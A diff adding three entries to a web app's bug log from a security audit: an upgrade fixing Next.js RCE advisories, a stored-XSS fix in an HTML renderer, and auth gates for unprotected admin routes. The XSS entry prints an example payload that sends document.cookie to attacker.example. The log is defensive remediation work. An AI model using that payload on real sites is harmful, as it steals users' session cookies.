@@ -19,6 +19,56 @@ Track issues here during development. Format:
 
 ## Open Issues
 
+## BUG-034: Installed Next.js (16.2.4) had two unauthenticated, critical-severity RCE CVEs plus a dozen other high/critical advisories, all fixed by a same-major-version patch bump
+**Status:** Fixed
+**Severity:** Critical
+**Area:** Dependencies
+**Reported:** 2026-09-25 (`security`, first-pass audit)
+**Fixed:** 2026-09-25
+
+**Description:** `npm audit` (first run by the newly-stood-up `security` team) showed 42 vulnerabilities. The one requiring immediate action: the installed `next@16.2.4` (package.json already specified `^16.2.4`, ahead of the `CLAUDE.md` §3 "Next.js 15" table, which is stale) was in the vulnerable range for two **critical**, unauthenticated RCE advisories — [GHSA-p293-qw3h-jr36](https://github.com/advisories/GHSA-p293-qw3h-jr36) ("Unauthenticated Remote Code Execution on windows-hosted servers", CVSS 9.0) and [GHSA-2xp9-vwfh-vxw4](https://github.com/advisories/GHSA-2xp9-vwfh-vxw4) ("Unauthenticated Remote Code Execution in Image Optimization API when AVIF files are used") — plus ~20 more high/moderate advisories (middleware/proxy auth bypass, SSRF in Server Actions and rewrites, cache poisoning, DoS), all fixed in `16.3.3`+.
+**Root cause:** Dependency drift — nobody had run `npm audit` against this project before (confirmed empty `SECURITY.md` audit log prior to this entry; Shannon's CI `dependency-scan` job only posts a `::warning::` annotation and never fails the build, so this sat unnoticed through every green CI run).
+**Fix:** `npm install next@16.3.6` (latest stable `16.x` at the time, satisfies the existing `^16.2.4` package.json range — no `package.json` major-version edit, no breaking-change flag from `npm audit`). Verified `npm run type-check` clean, full `npm test` (138/138) clean, and a full `npm run build` completes successfully with the same route manifest as before. `npm audit --omit=dev` critical count dropped from 2 to 1 (see BUG-032 for the remaining one, `websocket-driver`, which is unrelated to Next.js).
+**Not fixed / backlog:** The remaining 39 findings (`security-reports/`, `SECURITY.md` audit log has the full breakdown) are almost entirely transitive dependencies of `firebase-tools` (a devDependency, local Firestore-emulator CLI only — never runs in the deployed app) or of unused direct dependencies (`mermaid`, `express-rate-limit`, `rate-limiter-flexible` are declared in `package.json` `dependencies` but never imported anywhere in `src/` — dead weight, not exploitable, but worth removing in a follow-up cleanup pass). `@anthropic-ai/sdk`'s one moderate advisory (insecure default permissions on an optional local-filesystem "memory tool") doesn't apply — the app never uses that SDK feature. None of these required an immediate fix; logged for a follow-up dependency-cleanup pass.
+**Verification:** `npm run type-check`, `npm test` (138/138), `npm run build` all clean post-upgrade.
+
+---
+
+## BUG-033: `renderContent()` — shared AI/user-exercise-text-to-HTML renderer — passed literal HTML straight through unescaped into `dangerouslySetInnerHTML`, a stored XSS reachable via the open-to-any-signed-in-user `schoolBank` collection
+**Status:** Fixed
+**Severity:** High
+**Area:** UI / Injection
+**Reported:** 2026-09-25 (`security`, first-pass audit)
+**Fixed:** 2026-09-25
+
+**Description:** `src/lib/renderContent.ts` converts an exercise's AI-generated (or teacher-edited) `statement`/`solution` text into HTML, which every consumer (`ExerciseCard.tsx`, `ExerciseEditor.tsx`, `/bank`, `/student/practice`, `/exam/[id]`, `/print`, `/community`) inserts via `dangerouslySetInnerHTML` with no further sanitization. Three of its internal helpers — `applyMarkdown()` (the main text-rendering path), `renderCellMath()` (table cells), and the "document block" body-rendering regex (economics/sociology/history-style cited-document exercises) — only ever transformed specific markdown patterns (`**bold**`, `*italic*`, `` `code` ``); any other literal text, including `<`/`>`/`"` characters, was passed straight through unescaped. `escapeHtml()` already existed in the same file (used correctly for `data-raw` editor attributes and a few other spots) but was never applied to the actual rendered text content in these three places.
+**Concrete exploit:** Any signed-in account (teacher or student — `firestore.rules`' `schoolBank/{exerciseId}` allows `write: if request.auth != null`, no ownership or role check) can freely edit an exercise's statement in `ExerciseEditor` (the "edit" action in the exam-creation flow) to include e.g. `<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">`, then share it to School Bank via `/bank`'s "Share to My School" action. Every other teacher or student at that school who subsequently views the exercise in `/bank` or `/student/practice` has that HTML/JS execute in their authenticated session — a stored, persistent XSS with real reach (School Bank content is shown to every signed-in user who matches the shared `schoolSlug`, not just the author).
+**Corroboration:** Shannon's existing CodeQL integration (`.github/workflows/security.yml`) had already flagged this exact pattern as `js/xss-through-dom` (severity: high) across every `dangerouslySetInnerHTML` consumer of `renderContent()`'s output — alerts #35, #33, #22, #7, #6, #5, #4, #3, #2 (`gh api repos/.../code-scanning/alerts`) — sitting open, unreviewed, since before the `security` team existed. This fix closes the shared root cause behind all of them; they should clear automatically once CodeQL re-scans this commit.
+**Root cause:** `applyMarkdown()`/`renderCellMath()`/the document-block regex treated the AI/user text as "already safe to embed as HTML," escaping only inside specific attribute values (`data-raw="..."`) rather than the visible rendered text itself.
+**Fix:** Added `escapeHtml()` as the first step in all three functions, before any markdown-pattern substitution runs. `escapeHtml()` only touches `& < > " '`, so it doesn't interfere with matching `**`, `` ` ``, digits, or colons in the existing regexes — legitimate bold/italic/code/list/KaTeX/mermaid/table rendering is unaffected (KaTeX output and the app's own generated block HTML — images, mermaid, pipe tables, document-block wrappers — are built separately via trusted string templates and spliced back in via `%%TOKEN%%` placeholders *after* this stage, so they were never at risk and aren't touched by this fix).
+**Verification:** New regression suite `src/__tests__/renderContent-xss.test.ts` (5 tests: raw `<img onerror>` in exercise-statement text, raw `<script>` inside a markdown table cell, raw HTML inside a "document" block body — all now render as inert escaped text — plus two non-regression checks that `**bold**`/`*italic*`/list markdown and inline/display KaTeX math still render as real tags). `npx vitest run` on the new file: 5/5 passed. Full `npm test`: 138/138 passed (133 pre-existing + 5 new). `npm run type-check` and `npm run build` both clean.
+
+---
+
+## BUG-032: 4 admin API routes and `/api/exam/publish` had zero server-side auth check — reachable by anyone, including one that granted a real user's account free Pro subscription time
+**Status:** Fixed
+**Severity:** Critical
+**Area:** API / Auth
+**Reported:** 2026-09-25 (`security`, first-pass audit)
+**Fixed:** 2026-09-25
+
+**Description:** Auditing every `src/app/api/**/route.ts` for a real server-side auth check (the BUG-026 method: don't just read the code path, trace whether a caller could reach it unauthenticated), found 5 routes under `src/app/api/admin/*` and `src/app/api/exam/*` with none at all, unlike every sibling admin route (which all gate on `verifyIdToken(request)` + `isAdmin(uid)`, see `src/lib/admin.ts`):
+- **`GET /api/admin/temp-promo`** (most severe) — hardcoded a real user's email and, on every unauthenticated `GET`, extended that account's Pro subscription by 30 days (`proExpiresAt`, `monthlyExamsGenerated: 0`, etc.) via the Admin SDK. Anyone who discovered the URL (or the account holder themselves) could grant that one account unlimited free Pro time indefinitely, repeatable on every call, fully bypassing the paywall for that account.
+- **`GET /api/admin/blog/check-env`** — leaked whether `GOOGLE_AI_API_KEY`/`CRON_SECRET` are configured plus the first 5 characters of the live Gemini API key, to anyone, no auth.
+- **`GET /api/admin/blog/seed`** — an unauthenticated `GET` performed a real Firestore write (seeding 3 hardcoded blog posts if not already present).
+- **`GET /api/admin/blog/diag`** — leaked the 10 most recent blog posts' internal doc IDs/metadata to anyone (lower severity — blog posts are otherwise-public content, but still an admin diagnostic route with no gate).
+- **`POST /api/exam/publish`** — no auth at all, and trusted a client-supplied `exam.teacherId` string with zero verification (the exact BUG-026-style "spoofable field" pattern, applied to an API route's request body instead of a Firestore rule): anyone could publish a "live exam" Firestore doc impersonating any teacher's uid. Confirmed via `grep` that no client code anywhere in `src/` actually calls this route — it's unreferenced/dead in the current UI, but was still live and reachable in production with an unbounded, unauthenticated Firestore-write primitive.
+**Root cause:** These routes were written without following the `verifyIdToken` + `isAdmin` pattern already established and used correctly by every other admin route in the same directory (`src/app/api/admin/stats/route.ts`, `.../users/route.ts`, `.../delete-user/route.ts`, etc.) — inconsistent application of an existing convention, not a missing convention.
+**Fix:** Added the standard `const uid = await verifyIdToken(request); if (!uid || !(await isAdmin(uid))) return 401` gate (mirroring `src/app/api/admin/stats/route.ts`) to all 4 admin routes. For `/api/exam/publish`, added `verifyIdToken` (any signed-in user, not admin-only — matches the feature's apparent intent of "a signed-in teacher publishes their own exam") and replaced `exam.teacherId || "anonymous"` with the server-verified `uid`, so the field can no longer be spoofed by the caller.
+**Verification:** `npm run type-check` clean. `npm run build` clean. No e2e coverage exists for any of these routes (none are called from the current UI except indirectly via the admin panel, which already sends a real token) — verified by code inspection of the exact diff against the working `stats`/`users` admin routes' pattern.
+
+---
+
 ## BUG-031: `buildCurriculaReference()` resolves its data via a runtime `require("@/data/curricula")` that only works inside a webpack/Next.js bundle
 **Status:** Fixed
 **Severity:** Low
